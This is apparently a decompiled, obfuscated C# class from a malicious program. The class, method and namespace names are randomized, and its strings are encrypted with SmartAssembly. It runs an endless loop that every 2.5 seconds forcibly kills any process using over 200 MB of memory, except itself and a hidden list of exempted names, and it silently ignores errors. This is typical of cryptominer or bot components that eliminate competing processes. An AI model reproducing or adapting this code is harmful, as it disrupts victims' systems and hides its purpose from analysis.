using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eMvPcEiNWKRwo;

public static class zoYFoDbQMGa
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void VJXBtoyqNwOjs()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107405915)) && !process.ProcessName.Contains(getString_0(107405874)) && !process.ProcessName.Contains(getString_0(107405865)) && !process.ProcessName.Contains(getString_0(107405888)) && !process.ProcessName.Contains(getString_0(107405875)) && !process.ProcessName.Contains(getString_0(107405830)) && !process.ProcessName.Contains(getString_0(107405849)) && !process.ProcessName.Contains(getString_0(107405804)) && !process.ProcessName.Contains(getString_0(107405823)) && !process.ProcessName.Contains(getString_0(107405778)) && !process.ProcessName.Contains(getString_0(107405789)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static zoYFoDbQMGa()
	{
		Strings.CreateGetStringDelegate(typeof(zoYFoDbQMGa));
	}
}
